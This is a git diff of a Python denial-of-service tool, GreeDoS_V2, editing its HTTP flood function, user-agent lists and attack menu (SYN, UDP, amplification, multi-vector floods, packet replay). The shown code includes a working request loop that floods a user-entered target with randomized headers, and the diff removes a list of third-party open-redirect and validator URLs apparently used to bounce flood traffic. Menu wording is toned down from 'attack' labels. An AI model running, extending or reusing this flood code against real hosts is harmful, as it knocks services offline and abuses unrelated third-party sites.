@@ -84,7 +84,7 @@ def random_http_headers():
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
         "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0)",
         "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
-             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
@@ -109,52 +109,6 @@ def random_http_headers():
         "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
         "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
         "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
-        "http://www.google.com/?q=",
-"http://www.usatoday.com/search/results?q=",
-"http://engadget.search.aol.com/search?q=",
-"http://www.bing.com/search?q=",
-"http://search.yahoo.com/search?p=",
-"http://www.ask.com/web?q=",
-"http://search.lycos.com/web/?q=",
-"https://validator.w3.org/check?uri=",
-"http://validator.w3.org/checklink?uri=",
-"http://www.icap2014.com/cms/sites/all/modules/ckeditor_link/proxy.php?url=",
-"http://www.rssboard.org/rss-validator/check.cgi?url=",
-"http://www2.ogs.state.ny.us/help/urlstatusgo.html?url=",
-"http://prodvigator.bg/redirect.php?url=",
-"http://validator.w3.org/feed/check.cgi?url=",
-"http://www.ccm.edu/redirect/goto.asp?myURL=",
-"http://forum.buffed.de/redirect.php?url=",
-"http://www.inow.co.nz/redirect.php?url=",
-"http://www.automation-drive.com/redirect.php?url=",
-"http://mytinyfile.com/redirect.php?url=",
-"http://ruforum.mt5.com/redirect.php?url=",
-"http://www.websiteperformance.info/redirect.php?url=",
-"http://www.airberlin.com/site/redirect.php?url=",
-"http://www.rpz-ekhn.de/mail2date/ServiceCenter/redirect.php?url=",
-"http://evoec.com/review/redirect.php?url=",
-"http://www.crystalxp.net/redirect.php?url=",
-"http://watchmovies.cba.pl/articles/includes/redirect.php?url=",
-"http://www.seowizard.ir/redirect.php?url=",
-"http://apke.ru/redirect.php?url=",
-"http://seodrum.com/redirect.php?url=",
-"http://redrool.com/redirect.php?url=",
-"http://blog.eduzones.com/redirect.php?url=",
-"http://www.onlineseoreportcard.com/redirect.php?url=",
-"http://www.wickedfire.com/redirect.php?url=",
-"http://searchtoday.info/redirect.php?url=",
-"http://www.bobsoccer.ru/redirect.php?url=",
-"http://newsdiffs.org/article-history/iowaairs.org/redirect.php?url=",
-"http://www.firmia.cz/redirect.php?url=",
-"http://palinstravels.co.uk/redirect.php?url=",
-"http://www.phuketbranches.com/admin/redirect.php?url=",
-"http://tools.strugacreative.com/redirect.php?url=",
-"http://www.elec-intro.com/redirect.php?url=",
-"http://maybeit.net/redirect.php?url=",
-"http://www.usgpru.net/redirect.php?url=",
-"http://openwebstuff.com/wp-content/plugins/wp-js-external-link-info/redirect.php?url=",
-"http://www.webaverage.com/redirect.php?url=",
-"http://www.seorehash.com/redirect.php?url=",
   "Mozilla/5.0 (Linux; Android 4.4.4; Nexus 5 Build/KTU84Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android 4.1.2; en-au; GT-I9305T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
  "Mozilla/5.0 (Linux; U; Android 4.2.2; my-mm; GT-M6a Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
@@ -310,7 +264,7 @@ def random_http_headers():
 "magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)",
 "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
 "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
-"Mozilla/5.7.4 (Fedora015; U; AMD_PhenX6 Linux Kernal 2.6.35.2; en-UK) DevKit/534.7 (Gecko) Chrome/7.0.517.44 GoogleR/9.47.1[BlackPanda]",
+"Mozilla/5.7.4 (Fedora015; U; AMD_PhenX6 Linux Kernel 2.6.35.2; en-UK) DevKit/534.7 (Gecko) Chrome/7.0.517.44 GoogleR/9.47.1[BlackPanda]",
 ]
     
     headers = {
@@ -321,8 +275,8 @@ def random_http_headers():
     return headers
 
 
-def random_https_headers():
-    """Generate HTTPS headers."""
+"""def random_https_headers():
+    
     user_agents = [
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
@@ -513,7 +467,7 @@ def random_https_headers():
 "magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)",
 "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
 "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
-"Mozilla/5.7.4 (Fedora015; U; AMD_PhenX6 Linux Kernal 2.6.35.2; en-UK) DevKit/534.7 (Gecko) Chrome/7.0.517.44 GoogleR/9.47.1[BlackPanda]",
+"Mozilla/5.7.4 (Fedora015; U; AMD_PhenX6 Linux Kernel 2.6.35.2; en-UK) DevKit/534.7 (Gecko) Chrome/7.0.517.44 GoogleR/9.47.1[BlackPanda]",
 ]
 
     
@@ -522,7 +476,7 @@ def random_https_headers():
         "Accept": "*/*",
         "Connection": "keep-alive"
     }
-    return headers
+    return headers """
 
 
 
@@ -544,7 +498,7 @@ def simulate_http_flood(target, duration, thread_id, stealth=False):
    
     if not target.lower().startswith(("http://", "https://")):
         target = "http://" + target
-        target = "https://" + target 
+        #target = "https://" + target 
 
 
     end_time = time.time() + duration
@@ -553,7 +507,7 @@ def simulate_http_flood(target, duration, thread_id, stealth=False):
         try:
             params = {"rand": random.randint(1000, 9999)}
             requests.get(target, headers=random_http_headers(), params=params, timeout=2)
-            requests.get(target, headers=random_https_headers(), params=params, timeout=3)
+            #requests.get(target, headers=random_https_headers(), params=params, timeout=3)
             count += 1
         except Exception:
             pass
@@ -621,6 +575,8 @@ def simulate_high_speed_replay(pcap_file, interface, duration, stealth=False):
                 run(command)
         except Exception as e:
             console.log(f"[red]Error with Tcpreplay: {e}[/red]")
+            console.log(f"[red]if Tcpreplay is not installed then install this via, sudo apt install tcpreplay {e}[/red]")
+
             break
     console.log("[High-Speed Replay]: Completed.")
 
@@ -665,10 +621,10 @@ def run_attack_in_parallel(attack_func, target, duration, num_processes, stealth
 # Terminal Menu 
 def main_menu():
     console.print(GreeDoS_LOGO, style="bold cyan", justify="center")
-    console.print("[bold red]-------------------- Welcome to GreeDoS_V2 - Cybersecurity Red Team Tool --------------------[/bold red]\n", justify="center")
+    console.print("[bold red]-------------------- Welcome to GreeDoS_V2 --------------------[/bold red]\n", justify="center")
     console.print("[bold blue]----------------------- Copyright 2025_MrEchoFi_EbwerBrothers ------------------------[/bold blue]\n", justify="center")
     
-    target = console.input("[bold green]Enter target IP or domain (e.g., http://example.com): [/bold green]").strip()
+    target = console.input("[bold green]Enter IP or domain (e.g., http://example.com): [/bold green]").strip()
     target_ip = resolve_target(target)
 
     try:
@@ -683,10 +639,10 @@ def main_menu():
     while True:
         console.print("\n[bold yellow]Choose an attack type to simulate:[/bold yellow]")
         console.print("[1] HTTP/HTTPs Flood (Realistic HTTP GET)")
-        console.print("[2] SYN Flood (Protocol Attack)")
-        console.print("[3] UDP Flood (Volumetric Attack)")
-        console.print("[4] Amplification Attack (Simulated)")
-        console.print("[5] Multi-Vector Attack (All types concurrently)")
+        console.print("[2] SYN Flood (Protocol)")
+        console.print("[3] UDP Flood (Volumetric)")
+        console.print("[4] Amplification(Simulated)")
+        console.print("[5] Multi-Vector (All types concurrently)")
         console.print("[6] High-Speed Packet Replay (Tcpreplay)")
         console.print("[7] Exit\n")
 
